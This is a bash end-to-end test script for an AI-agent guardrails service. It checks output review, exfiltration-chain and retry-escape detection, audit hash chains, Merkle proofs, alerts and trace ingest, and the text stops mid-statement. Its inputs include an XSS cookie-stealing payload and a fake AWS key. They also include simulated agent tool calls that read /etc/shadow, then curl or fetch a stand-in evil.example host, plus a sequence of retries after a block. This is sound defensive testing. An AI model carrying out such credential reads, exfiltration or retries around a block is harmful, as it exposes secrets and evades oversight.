#!/usr/bin/env bash
# =============================================================================
# Guardrails full-flow E2E — API-ONLY (no direct SQLite / Redis access).
#
# Simulates the REAL user operation flow end to end. Every assertion is made
# through an HTTP API; the script NEVER opens the control SQLite file and NEVER
# runs sqlite3/redis-cli. Data reaches the control plane the same way it does in
# production: the engine publishes audit events to Kafka and the control plane
# ingests them; trace events are produced to Kafka in the MCP-proxy's wire
# format (the real transport, not a DB poke).
#
#   运营台 (control HTTP API)          engine HTTP API              Kafka
#   -------------------------          ----------------           ------
#   create tenant         -----------> (evaluate)  --audit-->     control ingest
#   output-review-stats   <-------------------------------------+
#   decision-bom / Merkle / export    (engine output review)     |
#   alerts list/ack/BOM   <-------------------------------------+
#   trace-chain / checkpoint / seal   (proxy wire format) --trace--> control
#
# Engine coverage (via POST /v1/evaluate — the caller's real flow):
#   B1/B3/B4  output review matrix: XSS -> deny+reject, credential ->
#             deny+redact+sanitized_content, normal -> allow+warn
#   B2        streaming-window review (stream_chunk=true) -> disposal
#   RATE      evaluate rate limiter v2: 30 windows of one trace unthrottled
#   NOCHAT    /v1/chat/completions is REMOVED from the engine (404)
#   role      evaluate role is a closed enum (user -> 400 unsupported_role)
#   C1        chain pattern: sensitive read -> external egress (chain-exfil)
#   C2        retry-escape after a block — reproduced with REAL evaluate calls
#             (a deny+full prior_signal blocks call 1; two changed retries +
#             the current call trip retry-escape). The old version LPUSHed a
#             synthetic tool_history via redis-cli; the detector now sees the
#             exact history the engine itself records from real calls.
#
# Control coverage (via 运营台 admin APIs, data via real Kafka ingest):
#   A8/B7 output-review stats: answer-level aggregation of the real engine
#         output-review events (XSS/credential/window denies)
#   A6    Decision BOM reconstruction from a real ingested event (event_id
#         drives the Merkle proof — no seeded event ids)
#   A4    Merkle proof + independent verify (correct root+proof -> true,
#         tampered root -> false)
#   A7    encrypted export (AES-GCM, no plaintext leak) + export list/404
#   A3    audit hash-chain verify + daily-anchor seal + read-back + chain status
#   A3    per-session trace-chain verify: valid 2-step chain (Kafka, proxy
#         wire format) passes; tenant-level verify flags nothing broken
#   C4    alerts lifecycle: auto-created from the deny audit event -> list ->
#         get -> ack -> BOM -> 404
#   C5    session checkpoint read path (written from ingested trace events)
#   V17    proxy policy: GET normalized defaults -> PUT round-trip -> GET
#         reflects the saved row; upstream without a url and an invalid
#         fallback_policy -> 400; a rejected PUT leaves the saved row intact
#         (tb_proxy_policy read/write + the Redis publish that hot-reloads)
#   V18    tool_args round-trip: the tool_args produced in the proxy wire
#         format reads back verbatim through decision-bom trace_steps, the
#         session timeline and the trace chain endpoint
#
# Known gaps / dropped checks (deliberate, with reason):
#   - sqlite ".tables" schema check: no API lists tables; every new table is
#     instead exercised functionally (stats/BOM/merkle/export/alerts/checkpoint/
#     trace-chain/daily-anchor seal/proxy-policy).
#   - MySQL-side parity (V16-V18 tables/columns, seed bundle ids): this E2E
#     runs control on SQLite, so the MySQL schema is guarded by
#     SchemaDialectParityTest (unit level), not here.
#   - tampered trace-chain row: not producible through any real flow —
#     TraceEventIngestor recomputes curr_hash at ingest and no API mutates
#     tb_agent_trace. The verifier's tamper/gap/unchained branches are covered
#     by TraceChainVerifierTest (unit level) instead.
#   - engine C0 chainAnomaly delta from an L3 Groovy rule (needs a rule store).
#   - MCP-proxy STI (B6) — Rust binary, separate harness.
#   - SDK streaming wrap_stream end-to-end — covered by
#     virbius-review-sdk tests + schemas/review-window-vectors.json.
#
# Requires: java, curl, python3, nc, docker (kafka console producer), a
# reachable Redis and Kafka. Kafka may be started via docker-compose.infra.yml.
#
# Usage:            bash scripts/test-guardrails-e2e.sh
# Skip build:       SKIP_BUILD=1 bash scripts/test-guardrails-e2e.sh
# Custom ports:     CONTROL_PORT=18080 ENGINE_PORT=18082 MOCK_PORT=18999
# Keep logs:        KEEP_WORK=1 bash scripts/test-guardrails-e2e.sh
# =============================================================================
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

CONTROL_PORT="${CONTROL_PORT:-18080}"
ENGINE_PORT="${ENGINE_PORT:-18082}"
MOCK_PORT="${MOCK_PORT:-18999}"
REDIS_URL="${VIRBIUS_REDIS_URL:-redis://127.0.0.1:6379}"
REDIS_HOST="${REDIS_HOST:-127.0.0.1}"; REDIS_PORT="${REDIS_PORT:-6379}"
KAFKA_HOST="${KAFKA_HOST:-127.0.0.1}"; KAFKA_PORT="${KAFKA_PORT:-9092}"
AUDIT_TOPIC="virbius-audit-events"
TRACE_TOPIC="virbius-trace-events"
# The day whose (chained) trace rows the daily-anchor seal is asked to seal.
# Trace events are produced with occurred_at on this day, so the seal has
# real leaves to Merkle-anchor.
ANCHOR_DATE="${ANCHOR_DATE:-2026-10-14}"

WORK="$(mktemp -d "${TMPDIR:-/tmp}/virbius-e2e.XXXXXX")"
LOGS="$WORK/logs"; DATA="$WORK/data"
mkdir -p "$LOGS" "$DATA"

PASS=0; FAIL=0
green(){ printf '\033[0;32m%s\033[0m\n' "$*"; }
red(){ printf '\033[0;31m%s\033[0m\n' "$*"; }
info(){ printf '\033[0;36m[INFO]\033[0m %s\n' "$*"; }
check(){ if [ "$1" = "1" ]; then PASS=$((PASS+1)); green "  PASS  $2"; else FAIL=$((FAIL+1)); red "  FAIL  $2"; fi; }
jget(){ python3 -c "import sys,json;d=json.load(sys.stdin);$1" "${2:-}" 2>/dev/null || echo "PARSE_ERROR"; }

cleanup() {
  info "shutting down..."
  [ -n "${ENGINE_PID:-}" ] && kill "$ENGINE_PID" 2>/dev/null || true
  [ -n "${CONTROL_PID:-}" ] && kill "$CONTROL_PID" 2>/dev/null || true
  [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null || true
  pkill -f "$WORK/mock_ollama.py" 2>/dev/null || true
  wait 2>/dev/null || true
  if [ "${KEEP_WORK:-0}" = "1" ]; then
    info "KEEP_WORK=1: logs at $WORK"
  else
    rm -rf "$WORK"
  fi
}
trap cleanup EXIT INT TERM

# ── preconditions ────────────────────────────────────────────────────────────
for bin in java curl python3 nc docker; do
  command -v "$bin" >/dev/null 2>&1 || { red "missing required tool: $bin"; exit 2; }
done
# Refuse to run next to a live control instance. The audit hash chain head is
# coordinated in shared Redis (virbius:audit:chain:{tenant}) while every control
# writes its own rows into its own database, so a second instance in the
# consumer group consumes the same events, assigns a different audit_seq against
# the same shared head, and leaves both databases holding a gappy subset —
# HashChainVerifier then reports "seq gap" and every audit-chain assertion
# fails. That is a real integrity break, not a flake, so fail loudly instead of
# emitting a misleading red run.
if pgrep -f 'virbius-control-.*\.jar' >/dev/null 2>&1; then
  red "another virbius-control process is already running:"
  pgrep -fl 'virbius-control-.*\.jar' >&2 || true
  red "stop it first — it shares the Redis audit chain head and the Kafka consumer group."
  exit 2
fi
nc -z "$REDIS_HOST" "$REDIS_PORT" 2>/dev/null \
  || { red "Redis not reachable at $REDIS_HOST:$REDIS_PORT (engine requires it)."; exit 2; }
if ! nc -z "$KAFKA_HOST" "$KAFKA_PORT" 2>/dev/null; then
  info "Kafka not on $KAFKA_HOST:$KAFKA_PORT — starting via docker-compose.infra.yml..."
  docker compose -p virbius-infra -f "$ROOT/docker-compose.infra.yml" up -d --wait kafka >/dev/null 2>&1 || true
  for _ in $(seq 1 30); do nc -z "$KAFKA_HOST" "$KAFKA_PORT" 2>/dev/null && break; sleep 1; done
  nc -z "$KAFKA_HOST" "$KAFKA_PORT" 2>/dev/null \
    || { red "Kafka not reachable (needed for the engine->control audit path)."; exit 2; }
fi
# Pre-create the audit/trace topics. Without this the control consumer subscribes
# to a topic that does not exist yet (auto-created only when the engine first
# publishes) and partition assignment is delayed ~1min — events published during
# the run would not be ingested until the test is over. Best-effort.
KAFKA_CID="$(docker ps --format '{{.Names}}' | grep -m1 kafka || true)"
[ -n "$KAFKA_CID" ] || { red "no kafka container found (needed for the console producer)"; exit 2; }
for t in "$AUDIT_TOPIC" "$TRACE_TOPIC"; do
  docker exec "$KAFKA_CID" /opt/kafka/bin/kafka-topics.sh \
    --bootstrap-server localhost:9092 --create --if-not-exists \
    --topic "$t" --partitions 3 --replication-factor 1 >/dev/null 2>&1 || true
done
info "Kafka topics ensured ($AUDIT_TOPIC, $TRACE_TOPIC)"

# Test/dev runs a SINGLE control instance (the pgrep guard above enforces it),
# so this harness uses the shared default consumer groups. Before starting,
# wait until those groups have DRAINED: a control killed by a previous run
# lingers as a group member until session.timeout expires, and while it does a
# fresh start is handed only part of the partitions — the console producer's
# sticky partitioner would then land the whole file on a partition nobody owns
# and every downstream assertion would fail on an empty table. With no other
# member, this run's control owns every partition, so /api/v1/ready is a
# sufficient readiness signal. `latest` keeps the run independent of whatever
# topic history earlier runs left behind.
wait_group_drained() { # $1=group $2=timeout_secs
  local group="$1" timeout="${2:-90}" n i
  for i in $(seq 1 "$timeout"); do
    n=$(docker exec "$KAFKA_CID" /opt/kafka/bin/kafka-consumer-groups.sh --bootstrap-server localhost:9092 \
         --group "$group" --describe --members 2>/dev/null | awk -v g="$group" '$1==g' | wc -l | tr -d ' ')
    [ "${n:-0}" -eq 0 ] && return 0
    sleep 1
  done
  return 1
}
for g in "virbius-audit-ingest" "virbius-trace-ingest"; do
  wait_group_drained "$g" 90 \
    || { red "consumer group $g still has a live member — stop the other control first"; exit 2; }
done

APP_VER="$(grep -m1 '<version>' "$ROOT/pom.xml" | sed 's/.*<version>\(.*\)<\/version>.*/\1/')"
ENGINE_JAR="$ROOT/virbius-engine/target/virbius-engine-${APP_VER}.jar"
CONTROL_JAR="$ROOT/virbius-control/target/virbius-control-${APP_VER}.jar"

# ── build ────────────────────────────────────────────────────────────────────
if [ "${SKIP_BUILD:-0}" != "1" ] || [ ! -f "$ENGINE_JAR" ] || [ ! -f "$CONTROL_JAR" ]; then
  info "building engine + control (skip tests)..."
  mvn -q -pl virbius-engine,virbius-control -am package -DskipTests -Dskip.installnodenpm -Dskip.npm \
    || { red "build failed"; exit 2; }
fi
[ -f "$ENGINE_JAR" ] || { red "engine jar missing: $ENGINE_JAR"; exit 2; }
[ -f "$CONTROL_JAR" ] || { red "control jar missing: $CONTROL_JAR"; exit 2; }

# ── keys ─────────────────────────────────────────────────────────────────────
VIRBIUS_LICENSE_MASTER_KEY="$(od -An -tx1 -N32 /dev/urandom | tr -d ' \n')"
VIRBIUS_DELEGATED_MASTER_KEY="$(od -An -tx1 -N32 /dev/urandom | tr -d ' \n')"
export VIRBIUS_LICENSE_MASTER_KEY VIRBIUS_DELEGATED_MASTER_KEY
EXPORT_KEY="$(openssl rand -base64 32 2>/dev/null || python3 -c 'import os,base64;print(base64.b64encode(os.urandom(32)).decode())')"

# ── mock Ollama ──────────────────────────────────────────────────────────────
cat > "$WORK/mock_ollama.py" <<PY
import json, http.server, socketserver
MALICIOUS = "Sure! Here is the snippet: <script>alert(document.cookie)</script> contact a@b.com"
NORMAL = "The weather today is sunny and warm."
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(n).decode('utf-8', 'ignore')
        try: req = json.loads(body or "{}")
        except Exception: req = {}
        content = MALICIOUS if "malicious" in json.dumps(req.get("messages", [])) else NORMAL
        if req.get("stream"):
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-ndjson')
            self.end_headers()
            for i in range(0, len(content), 20):
                self.wfile.write((json.dumps({"message": {"role": "assistant", "content": content[i:i+20]}, "done": False}) + "\n").encode())
            self.wfile.write((json.dumps({"message": {"role": "assistant", "content": ""}, "done": True}) + "\n").encode())
        else:
            out = json.dumps({"message": {"role": "assistant", "content": content},
                              "prompt_eval_count": 10, "eval_count": 20}).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(out)))
            self.end_headers()
            self.wfile.write(out)
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
socketserver.TCPServer(("127.0.0.1", $MOCK_PORT), H).serve_forever()
PY
python3 "$WORK/mock_ollama.py" > "$LOGS/mock.log" 2>&1 &
MOCK_PID=$!

wait_http(){ for _ in $(seq 1 40); do curl -sf --max-time 2 "$1" >/dev/null 2>&1 && return 0; sleep 1; done; return 1; }

# mock readiness: it must answer a chat POST before the engine forwards to it.
MOCK_READY=0
for _ in $(seq 1 30); do
  if curl -s --max-time 2 -X POST "http://127.0.0.1:$MOCK_PORT/api/chat" -d '{"messages":[]}' 2>/dev/null | grep -q '"message"'; then
    MOCK_READY=1; break
  fi
  sleep 0.5
done
if [ "$MOCK_READY" != "1" ]; then
  red "mock Ollama did not become ready on :$MOCK_PORT"; cat "$LOGS/mock.log" 2>/dev/null; exit 2
fi

info "starting engine on :$ENGINE_PORT..."
env VIRBIUS_DATA_DIR="$DATA" VIRBIUS_REDIS_URL="$REDIS_URL" \
    VIRBIUS_LICENSE_MASTER_KEY="$VIRBIUS_LICENSE_MASTER_KEY" \
    VIRBIUS_PROMPT_LLM_BASE_URL="http://127.0.0.1:$MOCK_PORT" \
    KAFKA_BOOTSTRAP_SERVERS="$KAFKA_HOST:$KAFKA_PORT" \
    SPRING_PROFILES_ACTIVE=dev \
    java -jar "$ENGINE_JAR" --server.port="$ENGINE_PORT" \
      --virbius.evaluate.auth.enabled=false \
      --virbius.evaluate.auth.bootstrap-pem-file= \
    > "$LOGS/engine.log" 2>&1 &
ENGINE_PID=$!

# Single control instance (pgrep guard above + group drained before start):
# the default consumer groups are shared, no per-run group id is needed.
info "starting control on :$CONTROL_PORT..."
env VIRBIUS_DATA_DIR="$DATA" VIRBIUS_REDIS_URL="$REDIS_URL" \
    VIRBIUS_LICENSE_MASTER_KEY="$VIRBIUS_LICENSE_MASTER_KEY" \
    VIRBIUS_DELEGATED_MASTER_KEY="$VIRBIUS_DELEGATED_MASTER_KEY" \
    KAFKA_BOOTSTRAP_SERVERS="$KAFKA_HOST:$KAFKA_PORT" \
    SPRING_PROFILES_ACTIVE=dev \
    java -jar "$CONTROL_JAR" --server.port="$CONTROL_PORT" \
      --virbius.audit.export.key="$EXPORT_KEY" \
      --spring.kafka.consumer.auto-offset-reset=latest \
    > "$LOGS/control.log" 2>&1 &
CONTROL_PID=$!

wait_http "http://127.0.0.1:$ENGINE_PORT/admin/health" || { red "engine failed to start"; tail -n 30 "$LOGS/engine.log"; exit 2; }
# /ready: waits until the Kafka consumers have joined their (now sole-member) group.
wait_http "http://127.0.0.1:$CONTROL_PORT/api/v1/ready" || { red "control failed to start"; tail -n 30 "$LOGS/control.log"; exit 2; }
info "services up."

E="http://127.0.0.1:$ENGINE_PORT"
C="http://127.0.0.1:$CONTROL_PORT"

# Output review is exposed via POST /v1/evaluate with role=output: the engine
# returns disposal_action (+ sanitized_content for redact) and the caller
# applies it verbatim. Streaming windows are reviewed the same way with
# stream_chunk=true (the official SDK wraps this; its windowing is covered by
# the shared vectors in schemas/review-window-vectors.json).
evout(){ curl -s --max-time 20 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' -d "$1"; }
evtool(){ curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' --data-binary "@$1"; }

T="gr-t$$-$(date +%s)"
info "functional tenant=$T"

# ── Phase 1: 运营台 bootstrap (control API) ─────────────────────────────────
info "E2E: 运营台 create tenant (real operator flow)"
R=$(curl -s -X POST "$C/api/v1/admin/tenants" -H 'Content-Type: application/json' \
      -d "{\"tenant_id\":\"$T\",\"name\":\"guardrails e2e\"}")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("tenant_id")=="'"$T"'" or d.get("code")==200 else "0")')" \
      "create tenant $T via API"

AC="$C/api/v1/admin/tenants/$T"

# ── Phase 2: engine caller flow (deterministic output rules) ────────────────
info "E2E: engine output review via evaluate API (B1/B3/B4)"
R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-1\",\"trace_id\":\"tr-out-1\",\"content\":\"Sure! Here is the snippet: <script>alert(document.cookie)</script>\"}")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action")=="reject" and d.get("effective_action")=="deny" else "0")')" \
      "malicious output -> deny + disposal reject"

R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-2\",\"trace_id\":\"tr-out-2\",\"content\":\"leaked key AKIAABCDEFGHIJKLMNOP and mail a@b.com\"}")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action")=="redact" and "[REDACTED_AWS_KEY]" in (d.get("sanitized_content") or "") and "[REDACTED_EMAIL]" in (d.get("sanitized_content") or "") else "0")')" \
      "credential leak -> disposal redact + sanitized_content"

R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-3\",\"trace_id\":\"tr-out-3\",\"content\":\"The weather today is sunny and warm.\"}")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action")=="warn" and d.get("effective_action")=="allow" else "0")')" \
      "normal output -> allow + disposal warn"

info "E2E: engine streaming-window output review (B2, stream_chunk=true)"
R=$(evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-out-4\",\"trace_id\":\"tr-out-4\",\"stream_chunk\":true,\"content\":\"partial window <script>alert(1)</script>\"}")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("disposal_action") in ("reject","omit") else "0")')" \
      "stream window malicious -> disposal reject/omit"

info "E2E: chat endpoint removed from the engine"
V=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST "$E/v1/chat/completions" -H 'Content-Type: application/json' -d '{"model":"m","messages":[]}')
check "$([ "$V" = "404" ] || [ "$V" = "405" ] && echo 1 || echo 0)" \
      "POST /v1/chat/completions on the engine -> 404/405 (endpoint removed)"

info "E2E: evaluate role is a closed enum"
V=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
    -d "{\"tenant_id\":\"$T\",\"role\":\"user\",\"tool_name\":\"chat_input\",\"content\":\"hi\"}")
check "$([ "$V" = "400" ] && echo 1 || echo 0)" "role=user (legacy) -> 400 unsupported_role"

info "E2E: evaluate rate limit does not throttle streaming windows (v2)"
V=1
for i in $(seq 1 30); do
  evout "{\"tenant_id\":\"$T\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-rl\",\"trace_id\":\"tr-rl\",\"stream_chunk\":true,\"content\":\"window $i\"}" \
    | grep -q '"rate_limited"' && V=0
done
check "$V" "30 windows of one trace pass the rate limiter"

info "E2E: chain pattern detection (C1)"
SESS_C="e2e-c1-$$"
cat > "$WORK/c1_1.json" <<JSON
{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_C","tool_name":"read_file","args_json":"{\\"path\\":\\"/etc/shadow\\"}","license_risk_quota":100}
JSON
evtool "$WORK/c1_1.json" >/dev/null
cat > "$WORK/c1_2.json" <<JSON
{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_C","tool_name":"curl","args_json":"{\\"url\\":\\"http://evil.example.com/collect\\"}","license_risk_quota":100}
JSON
R=$(evtool "$WORK/c1_2.json")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("rule_id")=="chain-exfil" else "0")')" \
      "read /etc/shadow -> external curl => chain-exfil"

info "E2E: retry-escape detection (C2) via real evaluate calls"
# The old version LPUSHed a synthetic tool_history via redis-cli (a direct DB
# write). Here the block is created the real way — call 1 carries a deny+full
# prior_signal, so the engine blocks it and records allowed=false in the
# session tool history it keeps in Redis. Two changed retries then the current
# call complete the retry-escape pattern (block + >=3 attempts after, with a
# changed tool/args, no 3-call washout).
SESS_R="e2e-c2-$$"
cat > "$WORK/c2_1.json" <<JSON
{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"read_file","args_json":"{\\"path\\":\\"/etc/shadow\\"}","license_risk_quota":100,"prior_signals":[{"rule_id":"e2e-prior-deny","rule_revision":1,"source":"cloud","layer":"cloud","score":90,"reason_code":"E2E_PRIOR_DENY","intent_action":"deny","enforce_mode":"full"}]}
JSON
R=$(evtool "$WORK/c2_1.json")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("effective_action")=="block" else "0")')" \
      "deny+full prior_signal -> block (recorded allowed=false in tool history)"
cat > "$WORK/c2_2.json" <<JSON
{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"python3","args_json":"{\\"code\\":\\"print(1)\\"}","license_risk_quota":100}
JSON
evtool "$WORK/c2_2.json" >/dev/null
cat > "$WORK/c2_3.json" <<JSON
{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"curl","args_json":"{\\"url\\":\\"http://evil.example/b\\"}","license_risk_quota":100}
JSON
evtool "$WORK/c2_3.json" >/dev/null
cat > "$WORK/c2_4.json" <<JSON
{"tenant_id":"$T","role":"tool_call","session_id":"$SESS_R","tool_name":"fetch","args_json":"{\\"url\\":\\"http://evil.example/c\\"}","license_risk_quota":100}
JSON
R=$(evtool "$WORK/c2_4.json")
[ "${E2E_DEBUG:-0}" = "1" ] && printf 'DBG C2-4=%s\n' "${R:0:220}" >&2
check "$(printf '%s' "$R" | jget 'print("1" if d.get("rule_id")=="retry-escape" else "0")')" \
      "block + 2 changed retries + current => retry-escape"

# ── Phase 3: 运营台 observation via the real Kafka ingest ───────────────────
info "E2E: output-review stats (A8/B7) via real Kafka ingest"
# The engine-phase output reviews above publish deny events (XSS / credential /
# window) to Kafka; the control plane ingests them. Poll until a denied answer
# shows up, then assert the answer-level aggregation.
STATS=""; GOT=0
for _ in $(seq 1 45); do
  STATS=$(curl -s "$AC/audit/output-review-stats")
  GOT=$(printf '%s' "$STATS" | jget 'print(1 if d.get("data",{}).get("denied",0) >= 1 else 0)')
  [ "$GOT" = "1" ] && break
  sleep 1
done
check "$GOT" "output-review stats aggregate >=1 denied answer via Kafka ingest (no DB seeding)"
check "$(printf '%s' "$STATS" | jget 'print("1" if d.get("data",{}).get("window_events",0) >= 1 else "0")')" \
      "window_events >= 1 (raw deny events counted)"
check "$(printf '%s' "$STATS" | jget 'print("1" if (d.get("data",{}).get("deny_rate") or 0) > 0 else "0")')" \
      "deny_rate > 0"
check "$(printf '%s' "$STATS" | jget 'print("1" if d.get("data",{}).get("scene")=="output" else "0")')" \
      "stats scoped to the output scene"

info "E2E: decision BOM (A6) reconstructs the real XSS deny event"
BOM=""; EID=""; BOM_OK=0
for _ in $(seq 1 45); do
  BOM=$(curl -s "$AC/audit/decision-bom/tr-out-1")
  EID=$(printf '%s' "$BOM" | jget 'print(d.get("data",{}).get("audit_events",[{}])[0].get("event_id",""))')
  [ -n "$EID" ] && [ "$EID" != "PARSE_ERROR" ] && { BOM_OK=1; break; }
  sleep 1
done
check "$BOM_OK" "decision BOM reconstructs >=1 audit event for the XSS trace"
[ "${E2E_DEBUG:-0}" = "1" ] && printf 'DBG BOM=%s\n' "$(printf '%s' "$BOM" | head -c 400)" >&2
check "$(printf '%s' "$BOM" | jget 'print("1" if len(d.get("data",{}).get("audit_events",[]))>=1 and d.get("data",{}).get("audit_events",[{}])[0].get("effective_action")=="deny" else "0")')" \
      "BOM audit event carries the deny decision"

info "E2E: Merkle proof + independent verify (A4)"
curl -s "$AC/audit/proof/$EID" > "$WORK/proof.json"
ROOT=$(python3 -c 'import json,sys;d=json.load(open(sys.argv[1]))["data"];print(d["root_hash"] if d.get("found") and d.get("verified") else "")' "$WORK/proof.json" 2>/dev/null || echo "")
check "$([ -n "$ROOT" ] && echo 1 || echo 0)" "Merkle proof found + self-verified"
# verify-proof re-loads the leaf hash and folds the auditor-supplied steps —
# so the real proof (root + steps) must verify, and a tampered root must not.
python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1]))["data"].get("proof") or []))' "$WORK/proof.json" > "$WORK/steps.json"
V=$(curl -s -X POST "$AC/audit/verify-proof" -H 'Content-Type: application/json' \
    -d "{\"event_id\":\"$EID\",\"root_hash\":\"$ROOT\",\"proof\":$(cat "$WORK/steps.json")}" \
    | jget 'print("1" if d["data"]["verified"] else "0")')
check "$V" "verify-proof (correct root + proof) -> true"
V=$(curl -s -X POST "$AC/audit/verify-proof" -H 'Content-Type: application/json' \
    -d "{\"event_id\":\"$EID\",\"root_hash\":\"sha256:deadbeef\",\"proof\":$(cat "$WORK/steps.json")}" \
    | jget 'print("1" if not d["data"]["verified"] else "0")')
check "$V" "verify-proof (tampered root) -> false"

info "E2E: encrypted export (A7)"
JOB=$(curl -s -X POST "$AC/audit/export" -H 'Content-Type: application/json' -d '{"min_risk":50}' \
      | jget 'print(d["data"]["job_id"] if d["data"]["status"]=="done" else "")')
check "$([ -n "$JOB" ] && [ "$JOB" != "PARSE_ERROR" ] && echo 1 || echo 0)" "export job completed"
if [ -n "$JOB" ] && [ "$JOB" != "PARSE_ERROR" ]; then
  FMT=$(curl -s -D "$WORK/export.hdr" -o "$WORK/export.bin" "$AC/audit/export/$JOB/file" -w '%{http_code}')
  SZ=$(wc -c < "$WORK/export.bin" | tr -d ' ')
  LEAK=0; grep -q "OUTPUT_XSS" "$WORK/export.bin" 2>/dev/null && LEAK=1
  check "$([ "$FMT" = "200" ] && [ "$SZ" -gt 0 ] && echo 1 || echo 0)" "export artifact downloadable (200) and non-empty"
  check "$(grep -qi 'X-Virbius-Format: aes-256-gcm' "$WORK/export.hdr" && echo 1 || echo 0)" "export served as aes-256-gcm"
  check "$([ "$LEAK" = "0" ] && echo 1 || echo 0)" "export artifact encrypted (no plaintext OUTPUT_XSS)"
fi

info "E2E: alerts lifecycle (C4) — auto-created from the deny audit event"
ALERT_ID="alert-$T-tr-out-1"
ALERTS=""; ALERT_OK=0
for _ in $(seq 1 45); do
  ALERTS=$(curl -s "$AC/alerts?status=open&limit=200")
  printf '%s' "$ALERTS" | jget "print('1' if any(a.get('alert_id')=='$ALERT_ID' for a in d.get('data',[])) else '0')" | grep -q 1 \
    && { ALERT_OK=1; break; }
  sleep 1
done
check "$ALERT_OK" "alert auto-created from the XSS deny event (risk>=80, action=deny)"
if [ "$ALERT_OK" = "1" ]; then
  R=$(curl -s "$AC/alerts/$ALERT_ID")
  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("status")=="open" else "0")')" \
        "alert get shows status=open"
  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("session_id")=="s-out-1" else "0")')" \
        "alert carries the engine session_id"
  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("reason_code")=="OUTPUT_XSS" else "0")')" \
        "alert carries the OUTPUT_XSS reason"
  R=$(curl -s -X POST "$AC/alerts/$ALERT_ID/ack?operator=guardrails-e2e")
  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("acknowledged") else "0")')" \
        "alert ack returns acknowledged=true"
  R=$(curl -s "$AC/alerts/$ALERT_ID")
  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("acked_by")=="guardrails-e2e" else "0")')" \
        "alert get shows acked_by"
  R=$(curl -s "$AC/alerts/$ALERT_ID/bom")
  check "$(printf '%s' "$R" | jget 'print("1" if len(d.get("data",{}).get("audit_events",[]))>=1 else "0")')" \
        "alert BOM reconstructs its trace"
fi
R=$(curl -s "$AC/alerts/nope")
check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==404 else "0")')" "alert get missing -> 404 code"

# ── trace events: proxy wire format -> Kafka -> control ingest ──────────────
SID="e2e-tc-$$-$(date +%s)"
TRACE="tr-tc-$$-$(date +%s)"
emit(){  # $1=step_id $2=seq $3=tool $4=args_json $5=decision $6=rule $7=reason $8=risk
  python3 - "$T" "$TRACE" "$SID" "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$ANCHOR_DATE" <<'PY'
import sys, json
tenant, trace, sid, step_id, seq, tool, args, decision, rule, reason, risk, day = sys.argv[1:13]
print(json.dumps({
    "trace_id": trace, "session_id": sid, "tenant_id": tenant,
    "step_id": step_id, "parent_step_id": None, "step_seq": int(seq),
    "step_type": "tool_call", "layer": "edge",
    "user_id": "u-guard-e2e", "device_id": None,
    "input_role": None, "input_content_hash": None,
    "tool_name": tool, "tool_args_hash": "h-" + step_id, "tool_args": json.loads(args),
    "tool_decision": decision, "rule_id": rule, "reason_code": reason,
    "risk_score": int(risk), "tool_status": "ok", "tool_duration_ms": 12,
    "tool_result_preview": None, "content_size": None,
    "content_sampled": False, "dlp_masked": False,
    "upstream_name": "mock-upstream", "app_id": "agent-guard",
    "occurred_at": day + "T00:00:0" + seq + "Z",
}))
PY
}

{
  emit s1 1 read_file '{"path":"/etc/shadow"}'          allow "" "" 10
  emit s2 2 curl      '{"url":"http://evil.example/c"}' deny  chain-exfil CHAIN_EXFIL 90
} > "$WORK/trace.jsonl"

info "producing 2 trace steps (proxy wire format) -> Kafka $TRACE_TOPIC (session=$SID, tenant=$T)"
docker exec -i "$KAFKA_CID" /opt/kafka/bin/kafka-console-producer.sh \
  --bootstrap-server localhost:9092 --topic "$TRACE_TOPIC" < "$WORK/trace.jsonl" >/dev/null 2>&1 \
  || { red "kafka console producer failed"; exit 2; }

info "E2E: session checkpoint (C5) written from ingested trace events"
CK=""; CK_OK=0
for _ in $(seq 1 45); do
  CK=$(curl -s "$AC/sessions/$SID/checkpoint")
  N=$(printf '%s' "$CK" | jget 'print(d.get("data",{}).get("event_count",0))')
  [ "$N" = "2" ] && { CK_OK=1; break; }
  sleep 1
done
check "$CK_OK" "checkpoint event_count == 2 (produced 2 steps)"
check "$(printf '%s' "$CK" | jget 'print("1" if "read_file" in (d.get("data",{}).get("tool_names") or "") and "curl" in (d.get("data",{}).get("tool_names") or "") else "0")')" \
